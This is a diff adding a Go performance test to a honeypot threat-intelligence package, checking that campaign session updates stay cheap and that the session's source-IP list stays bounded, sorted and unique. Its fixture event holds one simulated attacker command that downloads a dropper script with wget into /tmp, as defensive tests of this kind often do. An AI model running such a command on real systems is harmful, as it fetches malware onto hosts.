@@ -2,6 +2,7 @@ package intelligence
 
 import (
 	"fmt"
+	"runtime"
 	"sync"
 	"testing"
 	"time"
@@ -245,6 +246,53 @@ func TestReturningCampaignGetsNewSessionID(t *testing.T) {
 	}
 	if second.SessionID == firstID {
 		t.Fatalf("new session reused flushed session ID %q", firstID)
+	}
+}
+
+// A campaign many bots share (one dropper URL, thousands of addresses) is one
+// session. Every Update re-sorted and re-copied its whole source-IP set, so
+// each event cost O(n log n) and a worker batch grew quadratic with the
+// campaign. A repeat sighting must not rebuild the list, and the list is
+// bounded.
+func TestTTPUpdateCostDoesNotGrowWithCampaign(t *testing.T) {
+	b := NewTTPBuilder(time.Hour)
+	ev := func(ip string) *database.Event {
+		return &database.Event{Honeypot: "cowrie", EventType: "command", SourceIP: ip,
+			Command: "cd /tmp; wget http://198.51.100.9/bins.sh", Timestamp: time.Now().UTC()}
+	}
+	for i := 0; i < 20000; i++ {
+		b.Update(ev(fmt.Sprintf("10.%d.%d.%d", i>>16&255, i>>8&255, i&255)))
+	}
+	small := NewTTPBuilder(time.Hour)
+	small.Update(ev("10.0.0.1"))
+	repeats := func(bld *TTPBuilder) uint64 {
+		var before, after runtime.MemStats
+		runtime.GC()
+		runtime.ReadMemStats(&before)
+		for i := 0; i < 200; i++ {
+			bld.Update(ev("10.0.0.1")) // repeat sightings
+		}
+		runtime.ReadMemStats(&after)
+		return after.TotalAlloc - before.TotalAlloc
+	}
+	// The same sightings must cost about the same on a 1-IP and a 20000-IP
+	// session (a ratio, so the race detector's overhead does not matter).
+	oneIP, bigSession := repeats(small), repeats(b)
+	if bigSession > 2*oneIP+(1<<20) {
+		t.Fatalf("200 repeat sightings allocated %d KiB on a 20000-IP session, %d KiB on a 1-IP one",
+			bigSession>>10, oneIP>>10)
+	}
+	s := b.GetActiveSessions()
+	if len(s) != 1 || len(s[0].SourceIPs) > maxSessionIPs {
+		t.Fatalf("sessions=%d source IPs=%d, want 1 session with at most %d", len(s), len(s[0].SourceIPs), maxSessionIPs)
+	}
+	for i := 1; i < len(s[0].SourceIPs); i++ {
+		if s[0].SourceIPs[i-1] >= s[0].SourceIPs[i] {
+			t.Fatal("source IPs not sorted and unique")
+		}
+	}
+	if s[0].EventCount != 20200 {
+		t.Fatalf("event count %d, want 20200", s[0].EventCount)
 	}
 }
 
